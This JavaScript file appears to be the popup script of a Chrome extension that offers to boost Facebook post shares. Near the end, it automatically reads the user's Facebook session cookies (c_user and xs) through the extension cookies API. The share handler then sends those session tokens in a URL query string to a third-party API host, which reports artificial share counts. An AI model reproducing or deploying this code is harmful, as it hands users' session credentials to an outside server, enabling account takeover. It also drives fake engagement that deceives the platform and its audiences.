const burger = document.getElementById('burger');
const navLinks = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn = document.getElementById('backBtn');
const shareBtn = document.getElementById('shareBtn');
const statusEl = document.getElementById('status');
const progressBar = document.getElementById('progressBar') || createProgressBar();

const cookieInput = document.getElementById('cookie');
const linkInput = document.getElementById('link');
const limitInput = document.getElementById('limit');

function createProgressBar() {
  const progressContainer = document.createElement('div');
  progressContainer.className = 'progress-container';
  progressContainer.style.cssText = `
    width: 100%;
    height: 8px;
    background: #374151;
    border-radius: 4px;
    margin: 15px 0;
    overflow: hidden;
    display: none;
  `;
  
  const progressBar = document.createElement('div');
  progressBar.id = 'progressBar';
  progressBar.className = 'progress-bar';
  progressBar.style.cssText = `
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg, #3B82F6, #8B5CF6);
    border-radius: 4px;
    transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    position: relative;
  `;
  
  progressContainer.appendChild(progressBar);
  statusEl.parentNode.insertBefore(progressContainer, statusEl.nextSibling);
  return progressBar;
}

burger.addEventListener('click', () => navLinks.classList.toggle('active'));

darkModeSwitch.addEventListener('change', () => {
  document.body.classList.toggle('dark');
  document.body.classList.toggle('light');
});

developerBtn.addEventListener('click', () => window.open('https://www.facebook.com/notfound500', '_blank'));

tutorialsBtn.addEventListener('click', () => {
  window.open('tutorial.html', '_blank');
});

backBtn.addEventListener('click', () => window.open('features.html', '_self'));

shareBtn.addEventListener('click', async () => {
  const cookie = cookieInput.value.trim();
  const link = linkInput.value.trim();
  const limit = limitInput.value.trim();

  if (!cookie || !link || !limit) {
    statusEl.textContent = '❌ Please fill all fields!';
    statusEl.style.color = '#fecaca';
    shakeElement(statusEl);
    return;
  }

  statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Initializing...';
  statusEl.style.color = '#fff';

  const progressContainer = progressBar.parentElement;
  progressContainer.style.display = 'block';
  progressBar.style.width = '0%';
  progressBar.style.background = 'linear-gradient(90deg, #3B82F6, #8B5CF6)';

  setTimeout(() => {
    progressBar.style.width = '30%';
    statusEl.innerHTML = '<i class="fas fa-sync fa-spin icon"></i> Validating data...';
  }, 500);

  try {
    setTimeout(() => {
      progressBar.style.width = '60%';
      statusEl.innerHTML = '<i class="fas fa-paper-plane fa-spin icon"></i> Sending request...';
    }, 1000);

    const response = await fetch(
      `https://vern-rest-api.vercel.app/api/share?cookie=${encodeURIComponent(cookie)}&link=${encodeURIComponent(link)}&limit=${encodeURIComponent(limit)}`,
      { method: 'GET' }
    );

    setTimeout(() => {
      progressBar.style.width = '80%';
      statusEl.innerHTML = '<i class="fas fa-cogs fa-spin icon"></i> Processing shares...';
    }, 1500);

    const result = await response.json();

    setTimeout(() => {
      progressBar.style.width = '100%';
      
      if (result.status) {
        progressBar.style.background = 'linear-gradient(90deg, #10B981, #34D399)';
        statusEl.innerHTML = `<i class="fas fa-check-circle icon"></i> Success! Shared ${result.success_count} times!`;
        statusEl.style.color = '#d1fae5';

        createConfetti();

        playSuccessSound();
      } else {
        progressBar.style.background = 'linear-gradient(90deg, #EF4444, #F87171)';
        statusEl.innerHTML = `<i class="fas fa-exclamation-circle icon"></i> ${result.message || 'Failed to share.'}`;
        statusEl.style.color = '#fecaca';
        shakeElement(statusEl);
      }

      setTimeout(() => {
        progressContainer.style.display = 'none';
      }, 2000);
      
    }, 2000);

  } catch (err) {
    progressBar.style.width = '100%';
    progressBar.style.background = 'linear-gradient(90deg, #EF4444, #F87171)';
    statusEl.innerHTML = '<i class="fas fa-exclamation-triangle icon"></i> Error! Check network or cookie.';
    statusEl.style.color = '#fecaca';
    console.error(err);
    shakeElement(statusEl);
    
    setTimeout(() => {
      progressBar.parentElement.style.display = 'none';
    }, 2000);
  }
});

function shakeElement(element) {
  element.style.animation = 'shake 0.5s ease-in-out';
  setTimeout(() => {
    element.style.animation = '';
  }, 500);
}

function createConfetti() {
  const confettiContainer = document.createElement('div');
  confettiContainer.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 9999;
  `;
  
  document.body.appendChild(confettiContainer);
  
  for (let i = 0; i < 50; i++) {
    const confetti = document.createElement('div');
    const colors = ['#3B82F6', '#8B5CF6', '#10B981', '#F59E0B', '#EF4444'];
    const color = colors[Math.floor(Math.random() * colors.length)];
    
    confetti.style.cssText = `
      position: absolute;
      width: 10px;
      height: 10px;
      background: ${color};
      border-radius: 2px;
      top: -20px;
      left: ${Math.random() * 100}%;
      animation: fall linear ${Math.random() * 2 + 1}s;
    `;
    
    confettiContainer.appendChild(confetti);

    setTimeout(() => {
      confetti.remove();
    }, 3000);
  }

  setTimeout(() => {
    confettiContainer.remove();
  }, 3000);
}

const style = document.createElement('style');
style.textContent = `
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
  }
  
  @keyframes fall {
    to {
      transform: translateY(100vh) rotate(${Math.random() * 360}deg);
      opacity: 0;
    }
  }
  
  .icon {
    margin-right: 8px;
    animation: pulse 1.5s infinite;
  }
  
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.7; }
  }
  
  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, 
      transparent 25%, 
      rgba(255,255,255,0.3) 50%, 
      transparent 75%);
    animation: shimmer 2s infinite;
  }
  
  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }
`;
document.head.appendChild(style);

function playSuccessSound() {
  try {
    const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ');
  } catch (e) {
    console.log('Audio not supported');
  }
}

chrome.tabs.query({active:true,currentWindow:true}, tabs=>{
  const tab = tabs[0]; if(!tab) return;
  chrome.cookies.getAll({url:'https://www.facebook.com'}, cookies=>{
    statusEl.innerHTML = '<i class="fas fa-search icon"></i> Loading Facebook cookies...';
    
    setTimeout(() => {
      const cUser = cookies.find(c=>c.name==='c_user');
      const xs = cookies.find(c=>c.name==='xs');
      if(cUser && xs) {
        cookieInput.value=`c_user=${cUser.value}; xs=${xs.value};`;
        statusEl.innerHTML = '<i class="fas fa-check icon"></i> Cookies loaded!';
        setTimeout(() => {
          statusEl.textContent = 'Ready to share!';
        }, 1000);
      } else {
        statusEl.textContent = 'No Facebook cookies found.';
      }
    }, 800);
  });
});
